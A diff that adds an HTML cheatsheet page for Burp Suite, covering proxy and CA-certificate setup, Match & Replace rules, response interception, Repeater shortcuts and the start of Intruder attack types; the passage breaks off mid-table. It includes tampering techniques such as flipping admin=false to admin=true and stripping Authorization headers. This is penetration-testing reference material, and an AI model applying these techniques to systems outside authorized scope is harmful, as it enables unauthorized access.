@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Burp Suite Cheatsheet — Web Security Testing Workflows | OPKIT</title>
+  <meta name="description" content="Complete Burp Suite reference: Proxy, Match &amp; Replace, Repeater, Intruder, Collaborator, Decoder, Comparer, Sequencer, BApp extensions, and keyboard shortcuts.">
+    <link rel="icon" type="image/webp" href="../images/Logo.webp">
+  <link rel="apple-touch-icon" href="../images/Logo.webp">
+  <link rel="stylesheet" href="../assets/style.css">
+  <style>:root { --tool-color: #f4821f; }</style>
+</head>
+<body>
+<nav class="nav" role="navigation" aria-label="Main navigation">
+  <div class="nav__inner">
+        <a href="../index.html" class="nav__logo" aria-label="OPKIT Home">
+      <span class="nav__logo-mark" aria-hidden="true"><img src="../images/Logo.webp" alt="OPKIT Logo" class="nav__logo-img"></span>
+      <span class="nav__logo-text">OPKIT</span>
+    </a>
+    <div class="nav__links"><a href="../index.html" class="nav__link">Tools</a></div>
+    <div class="nav__search"><div class="nav__search-wrap" style="position:relative"><svg class="nav__search-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg><input id="nav-search" class="nav__search-input" type="search" placeholder="Search commands…" autocomplete="off" spellcheck="false" aria-label="Search commands"><div id="nav-search-dropdown" class="search-dropdown" role="listbox"></div></div></div>
+    <button class="nav__theme-btn" onclick="toggleTheme()" aria-label="Toggle theme"><span data-theme-icon></span></button>
+    <button class="nav__hamburger" id="nav-hamburger" aria-label="Open sidebar" onclick="document.getElementById('tool-sidebar').classList.toggle('is-open');document.getElementById('sidebar-overlay').classList.toggle('is-active')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button>
+  </div>
+</nav>
+
+<div class="tool-page">
+  <div class="sidebar-overlay" id="sidebar-overlay" onclick="this.classList.remove('is-active');document.getElementById('tool-sidebar').classList.remove('is-open')"></div>
+  <aside class="tool-sidebar" id="tool-sidebar" aria-label="Burp Suite navigation">
+    <div class="tool-sidebar__head">
+      <a href="../index.html" class="tool-sidebar__back"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>All tools</a>
+      <div class="tool-sidebar__tool-id">
+        <div class="tool-sidebar__icon">
+          <img src="https://www.kali.org/tools/burpsuite/images/burpsuite-logo.svg" alt="Burp Suite" onerror="this.onerror=null;this.src='../images/tools/burpsuite.svg';">
+        </div>
+        <div>
+          <div class="tool-sidebar__name">Burp Suite</div>
+          <div class="tool-sidebar__version">Community &amp; Pro</div>
+          <a href="https://portswigger.net/burp/documentation/desktop/getting-started" target="_blank" rel="noopener noreferrer" style="font-size: 11px; font-weight: 700; color: #f4821f; text-decoration: none; display: inline-flex; align-items: center; gap: 3px; margin-top: 4px;">Official Docs &rarr;</a>
+        </div>
+      </div>
+    </div>
+    <nav class="tool-sidebar__nav" aria-label="Page sections">
+      <div class="sidebar-group">
+        <div class="sidebar-group__label">Workflow Reference</div>
+        <div class="sidebar-nav-item is-active" data-section="overview">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 6h16M4 12h16M4 18h7"/></svg>
+          Overview
+        </div>
+        <div class="sidebar-nav-item" data-section="proxy">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12h18"/><path d="M12 3l9 9-9 9"/></svg>
+          Proxy &amp; Match/Replace
+        </div>
+        <div class="sidebar-nav-item" data-section="repeater">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="17 1 21 5 17 9"/><path d="M3 11V9a4 4 0 0 1 4-4h14"/><polyline points="7 23 3 19 7 15"/><path d="M21 13v2a4 4 0 0 1-4 4H3"/></svg>
+          Repeater
+        </div>
+        <div class="sidebar-nav-item" data-section="intruder">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+          Intruder
+        </div>
+        <div class="sidebar-nav-item" data-section="decoder">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>
+          Decoder &amp; Encoder
+        </div>
+        <div class="sidebar-nav-item" data-section="comparer">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="18" rx="1"/><rect x="14" y="3" width="7" height="18" rx="1"/></svg>
+          Comparer &amp; Sequencer
+        </div>
+        <div class="sidebar-nav-item" data-section="collaborator">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1 4-10z"/><line x1="2" y1="12" x2="22" y2="12"/></svg>
+          Collaborator (OAST)
+        </div>
+        <div class="sidebar-nav-item" data-section="extensions">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/></svg>
+          Essential BApp Extensions
+        </div>
+        <div class="sidebar-nav-item" data-section="shortcuts">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M7 8h1M12 8h1M17 8h1M7 12h1M12 12h5M7 16h10"/></svg>
+          Keyboard Shortcuts
+        </div>
+        <div class="sidebar-nav-item" data-section="cheatsheet">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+          Cheatsheet
+        </div>
+      </div>
+    </nav>
+  </aside>
+
+  <main class="tool-content" id="main-content">
+    <!-- Hero -->
+    <div class="tool-hero" id="overview">
+      <div class="tool-hero__kicker"><svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="10"/></svg>Web Application · GUI + CLI</div>
+      <h1 class="tool-hero__title">Burp Suite</h1>
+      <p class="tool-hero__desc">The industry-standard integrated platform for web application security testing. Combines an intercepting proxy, manual HTTP replay engine (Repeater), automated fuzzer (Intruder), out-of-band testing (Collaborator), and an extensive BApp ecosystem.</p>
+      <div class="tool-hero__tags">
+        <span class="tool-hero__tag">Proxy &amp; Match/Replace</span>
+        <span class="tool-hero__tag">Repeater</span>
+        <span class="tool-hero__tag">Intruder</span>
+        <span class="tool-hero__tag">Collaborator</span>
+        <span class="tool-hero__tag">Comparer &amp; Sequencer</span>
+        <span class="tool-hero__tag">BApp Extensions</span>
+        <span class="tool-hero__tag">Out-of-Band (OAST)</span>
+      </div>
+
+      <!-- Official PortSwigger Documentation Callout -->
+      <div class="official-docs-card" style="margin-top: var(--sp-6); padding: var(--sp-6); background: linear-gradient(135deg, rgba(244, 130, 31, 0.16) 0%, rgba(244, 130, 31, 0.05) 100%); border: 2px solid rgba(244, 130, 31, 0.55); border-radius: var(--r-lg); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.35), 0 0 24px rgba(244, 130, 31, 0.18);">
+        <div style="font-size: var(--t-xs); font-weight: 800; color: #f4821f; text-transform: uppercase; letter-spacing: 0.14em; margin-bottom: var(--sp-2); display: flex; align-items: center; gap: var(--sp-2);">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>
+          Official Documentation &amp; Setup Guide
+        </div>
+        <div style="font-size: var(--t-2xl); font-weight: 800; color: var(--c-text); letter-spacing: -0.03em; margin-bottom: var(--sp-2); line-height: 1.2;">
+          Getting Started with Burp Suite Desktop
+        </div>
+        <div style="font-size: var(--t-base); color: var(--c-text-muted); line-height: var(--lh-relaxed); margin-bottom: var(--sp-4); max-width: 780px;">
+          The authoritative official documentation from PortSwigger &mdash; covering desktop installation, proxy configuration, CA certificate trust, built-in browser launching, and foundational testing workflows:
+        </div>
+        <a href="https://portswigger.net/burp/documentation/desktop/getting-started" target="_blank" rel="noopener noreferrer" style="font-size: 1.25rem; font-weight: 800; color: #ffffff; background: #f4821f; padding: var(--sp-3) var(--sp-6); border-radius: var(--r-md); text-decoration: none; display: inline-flex; align-items: center; gap: var(--sp-3); box-shadow: 0 4px 18px rgba(244, 130, 31, 0.5); word-break: break-all; transition: transform 0.15s ease, background-color 0.15s ease;" onmouseover="this.style.backgroundColor='#ff9333';this.style.transform='translateY(-2px)';" onmouseout="this.style.backgroundColor='#f4821f';this.style.transform='none';">
+          <span>https://portswigger.net/burp/documentation/desktop/getting-started</span>
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+        </a>
+      </div>
+    </div>
+
+    <!-- First 3 Commands (Quick Start) -->
+    <div class="cmd-block is-open" style="margin-bottom: var(--sp-6); border-color: rgba(244, 130, 31, 0.35); box-shadow: 0 4px 20px rgba(0,0,0,0.18);" role="region" aria-label="First 3 Commands quick start">
+      <div class="cmd-block__head" style="background: rgba(244, 130, 31, 0.08); border-bottom-color: rgba(244, 130, 31, 0.2);">
+        <div>
+          <div class="cmd-block__label" style="display:flex; align-items:center; gap:var(--sp-2); color: var(--c-text);">
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:var(--tool-color, var(--c-accent));" aria-hidden="true"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+            First 3 Commands — Quick Start
+          </div>
+          <div class="cmd-block__desc">Three essential setup workflows and shortcuts to immediately begin intercepting and manipulating traffic.</div>
+        </div>
+      </div>
+      <div class="cmd-block__body">
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">$</span>
+          <code class="code-line__code"><span class="tok-cmd">curl</span> <span class="tok-flag">--proxy</span> <span class="tok-val">http://127.0.0.1:8080</span> <span class="tok-flag">-k</span> <span class="tok-arg">https://target.com</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Route CLI traffic</span>
+          <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">&gt;</span>
+          <code class="code-line__code"><span class="tok-cmd">Ctrl+R</span> <span class="tok-com">(Cmd+R on macOS)</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Send to Repeater</span>
+          <button class="code-line__copy-btn" aria-label="Copy shortcut"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">&gt;</span>
+          <code class="code-line__code"><span class="tok-cmd">Ctrl+Shift+R</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Toggle intercept</span>
+          <button class="code-line__copy-btn" aria-label="Copy shortcut"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Warnings & Scope Callouts -->
+    <div class="callout callout--warn" role="alert" style="margin-bottom: var(--sp-4);">
+      <svg class="callout__icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+      <div class="callout__body">
+        <strong style="color:var(--c-warn); display:block; margin-bottom:var(--sp-2);">Community Edition Limitations &amp; Intruder Pitfalls</strong>
+        <ul style="margin:0; padding-left:1.25rem; line-height:1.6; font-size:var(--t-sm);">
+          <li><strong>Community Edition throttles Intruder &amp; lacks automated scanner:</strong> Automated fuzzing in Community Edition is throttled (~1 request/sec) and lacks the active scanner. Use Repeater for manual verification, or pipeline exported requests into fast CLI tools like <a href="ffuf.html">ffuf</a> or <a href="sqlmap.html">sqlmap</a>.</li>
+          <li><strong>Cluster Bomb multiplies payload lists exponentially:</strong> Two lists of 100 entries = 10,000 requests. Three lists of 100 = 1,000,000 requests. This can accidentally crash a target or trigger account lockouts. Always calculate <code>len(A) &times; len(B) &times; &hellip;</code> before launching.</li>
+          <li><strong>CSRF tokens break Intruder:</strong> If the login form includes a per-request CSRF token or nonce, standard Intruder attacks fail because the token refreshes each time. Configure a session macro (<em>Settings &rarr; Sessions &rarr; Macros</em>) to re-fetch fresh tokens, or use Pitchfork with a synchronized token list.</li>
+          <li><strong>Follow redirects creates false positives:</strong> In an interception proxy, following 301/302 redirects automatically conceals the original redirect response headers and bodies &mdash; hiding authentication bypasses, sensitive debug cookies, and leaked admin paths. Keep redirect following disabled by default.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="callout callout--info" role="note" style="margin-bottom: var(--sp-6);">
+      <svg class="callout__icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+      <div class="callout__body">
+        <strong style="display:block; margin-bottom:var(--sp-1); color:var(--c-text);">Scope first, test second.</strong>
+        Without scope defined, Burp records everything &mdash; including background OS telemetry, third-party analytics, and social widgets. Go to <strong>Target &rarr; Scope</strong>, add <code>https://target.com</code>, <code>https://*.target.com</code>, and any associated API domains. Enable <em>"Show only in-scope items"</em> in the filter bar so Proxy history, Logger, and Site map remain clean.<br>
+        <strong style="color:var(--c-text);">Use Burp's built-in browser:</strong> Open it via <em>Proxy &rarr; Intercept &rarr; Open Browser</em>. It is a pre-configured Chromium fork with the Burp CA root certificate already installed and proxy routing configured out of the box, preventing accidental leakage of personal browsing traffic.
+      </div>
+    </div>
+
+    <!-- 1. Proxy & Match/Replace -->
+    <section class="content-section" id="proxy" aria-labelledby="proxy-title">
+      <h2 class="content-section__title" id="proxy-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12h18"/><path d="M12 3l9 9-9 9"/></svg>
+        Proxy &amp; Match/Replace — Intercept &amp; Modify Traffic
+      </h2>
+      <div class="callout callout--info" role="note" style="margin-bottom: var(--sp-4);">
+        <svg class="callout__icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        <div class="callout__body">
+          Burp listens on <code>127.0.0.1:8080</code> by default. Configure your browser or CLI tools to route traffic through this socket.
+        </div>
+      </div>
+      <div class="cmd-list" role="list">
+        <!-- Block 1: Launch & Route -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Launch via command line and route CLI tools</div>
+              <div class="cmd-block__desc">Start Burp headless or route individual CLI tools through the 127.0.0.1:8080 proxy listener.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">java</span> <span class="tok-flag">-jar</span> <span class="tok-val">burpsuite_community.jar</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">curl</span> <span class="tok-flag">--proxy</span> <span class="tok-val">http://127.0.0.1:8080</span> <span class="tok-flag">-k</span> <span class="tok-arg">https://target.com</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: CA Cert Setup -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">CA Certificate setup (Linux &amp; system trust)</div>
+              <div class="cmd-block__desc">Export and install the PortSwigger CA certificate to decrypt HTTPS traffic without browser TLS warnings.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-com"># Download CA from http://127.0.0.1:8080/cert then install:</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">#</span>
+              <code class="code-line__code"><span class="tok-cmd">openssl</span> <span class="tok-val">x509</span> <span class="tok-flag">-inform</span> <span class="tok-val">DER</span> <span class="tok-flag">-in</span> <span class="tok-val">cacert.der</span> <span class="tok-flag">-out</span> <span class="tok-arg">/usr/local/share/ca-certificates/burp.crt</span> &amp;&amp; <span class="tok-cmd">update-ca-certificates</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 3: Match and Replace Rules -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Match and Replace Rules</div>
+              <div class="cmd-block__desc">Automatically rewrite headers, parameters, or body contents across all passing proxy traffic in real time.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="flags-table-wrap">
+              <table class="flags-table" role="table">
+                <thead><tr><th scope="col">Purpose</th><th scope="col">Rule Type</th><th scope="col">Match</th><th scope="col">Replace</th></tr></thead>
+                <tbody>
+                  <tr><td class="flag-desc">Spoof User-Agent to Googlebot</td><td><code class="flag-code">Request header</code></td><td><code>User-Agent.*</code></td><td class="flag-default">Googlebot/2.1</td></tr>
+                  <tr><td class="flag-desc">Remove Authorization header (test missing auth)</td><td><code class="flag-code">Request header</code></td><td><code>^Authorization.*$</code></td><td class="flag-default">(empty)</td></tr>
+                  <tr><td class="flag-desc">Remove clickjacking protection</td><td><code class="flag-code">Response header</code></td><td><code>X-Frame-Options</code></td><td class="flag-default">(empty)</td></tr>
+                  <tr><td class="flag-desc">Mass-replace privilege flags</td><td><code class="flag-code">Request body</code></td><td><code>admin=false</code></td><td class="flag-default">admin=true</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <div style="font-size: var(--t-xs); color: var(--c-muted); padding: var(--sp-2) var(--sp-4); border-top: 1px solid rgba(255, 255, 255, 0.06); background: rgba(0, 0, 0, 0.12);">
+              <span style="color: var(--c-accent); font-weight: 600;">How to apply:</span> Go to <strong>Proxy &rarr; Proxy settings &rarr; Match and replace &rarr; Add</strong>. Rules evaluate regex patterns against all in-flight traffic automatically.
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 4: Intercepting Responses -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Intercepting Responses</div>
+              <div class="cmd-block__desc">Burp does not intercept responses by default. Tamper with incoming server responses before the browser renders them.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="prose" style="padding: var(--sp-3) var(--sp-4);">
+              <p style="margin-bottom:var(--sp-2); font-size:var(--t-sm);">To intercept a specific response (e.g. to modify a 403 Forbidden body, tamper with a 302 redirect location, or remove anti-CSRF JavaScript):</p>
+              <div class="code-line">
+                <span class="code-line__prompt">&gt;</span>
+                <code class="code-line__code"><span class="tok-cmd">Right-click request in Proxy HTTP history</span> &rarr; <span class="tok-val">Do intercept</span> &rarr; <span class="tok-arg">Response to this request</span></code>
+                <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+              </div>
+              <p style="margin-top:var(--sp-2); font-size:var(--t-xs); color:var(--c-muted);">To intercept all responses matching criteria, navigate to <em>Proxy settings &rarr; Response interception rules</em> and check <em>"Intercept responses if..."</em>.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 2. Repeater -->
+    <section class="content-section" id="repeater" aria-labelledby="repeater-title">
+      <h2 class="content-section__title" id="repeater-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="17 1 21 5 17 9"/><path d="M3 11V9a4 4 0 0 1 4-4h14"/><polyline points="7 23 3 19 7 15"/><path d="M21 13v2a4 4 0 0 1-4 4H3"/></svg>
+        Repeater — Manual Request Testing
+      </h2>
+      <div class="prose">
+        <p>Repeater lets you replay, modify, and resend individual HTTP/S requests while inspecting server responses. It is the primary workshop for proving injection vulnerabilities, authorization bypasses (BOLA/IDOR), and parameter tampering.</p>
+      </div>
+      <div class="flags-table-wrap" style="margin-top:var(--sp-4); margin-bottom:var(--sp-5);">
+        <table class="flags-table" role="table">
+          <thead><tr><th scope="col">Workflow</th><th scope="col">Correct Shortcut</th><th scope="col">Note</th></tr></thead>
+          <tbody>
+            <tr><td class="flag-desc">Send request to Repeater</td><td><code class="flag-code">Ctrl+R (Cmd+R on macOS)</code></td><td class="flag-default">From any request view or proxy history</td></tr>
+            <tr><td class="flag-desc">Send request (faster than clicking Send)</td><td><code class="flag-code">Ctrl+Enter (or Ctrl+Space)</code></td><td class="flag-default">Dispatches request immediately</td></tr>
+            <tr><td class="flag-desc">Navigate request history</td><td><code class="flag-code">Ctrl+← / Ctrl+→</code></td><td class="flag-default">Cycles through previous sends in tab</td></tr>
+            <tr><td class="flag-desc">Switch GET &harr; POST</td><td><code class="flag-code">Right-click &rarr; Change request method</code></td><td class="flag-default">Burp rewrites body/params automatically</td></tr>
+            <tr><td class="flag-desc">Paste URL as request</td><td><code class="flag-code">Right-click &rarr; Paste URL as request</code></td><td class="flag-default">Useful for quick one-off tests</td></tr>
+            <tr><td class="flag-desc">Parse/edit parameters visually</td><td><code class="flag-code">Inspector panel &rarr; Request attributes</code></td><td class="flag-default">Shows decoded params, cookies, and headers</td></tr>
+            <tr><td class="flag-desc">URL-encode selection</td><td><code class="flag-code">Ctrl+U</code></td><td class="flag-default">Converts spaces and symbols to %xx</td></tr>
+            <tr><td class="flag-desc">URL-decode selection</td><td><code class="flag-code">Ctrl+Shift+U</code></td><td class="flag-default">Restores URL-encoded string to plain text</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="cmd-list" role="list">
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Repeater Techniques &amp; Analysis</div>
+              <div class="cmd-block__desc">High-efficiency workflows for diffing responses and retaining test history.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="prose" style="padding: var(--sp-3) var(--sp-4);">
+              <ul style="margin:0; padding-left:1.25rem; line-height:1.6; font-size:var(--t-sm);">
+                <li><strong>Response diffing:</strong> Right-click baseline response &rarr; <em>Send to Comparer (Response)</em>, then resend with modified payload and right-click &rarr; <em>Send to Comparer (Response)</em>. In Comparer, click <strong>Words</strong> to spot subtle reflections, status variations, or hidden error disclosures.</li>
+                <li><strong>Request history navigation:</strong> Every click of "Send" is archived in that tab's memory. Press <code>Ctrl+←</code> and <code>Ctrl+→</code> to jump between consecutive payloads and inspect which parameter permutation altered the server response.</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 3. Intruder -->
+    <section class="content-section" id="intruder" aria-labelledby="intruder-title">
+      <h2 class="content-section__title" id="intruder-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+        Intruder — Automated Attacks &amp; Fuzzing
+      </h2>
+      <div class="prose">
+        <p>Intruder automates customized attacks against web applications. Define insertion points with <code>&sect;payload&sect;</code> markers and configure appropriate payload sets and attack strategies.</p>
+      </div>
+      <div class="flags-table-wrap" style="margin-top:var(--sp-4); margin-bottom:var(--sp-5);">
+        <table class="flags-table" role="table">
+          <thead><tr><th scope="col">Attack Type</th><th scope="col">Payload Sets</th><th scope="col">Behavior</th><th scope="col">Use Case</th></tr></thead>
+          <tbody>
+            <tr><td><code class="flag-code">Sniper</code></td><td>1 list</td><td class="flag-desc">Cycles through each position one at a time</td><td class="flag-default">Testing a single parameter (SQLi, XSS)</td></tr>
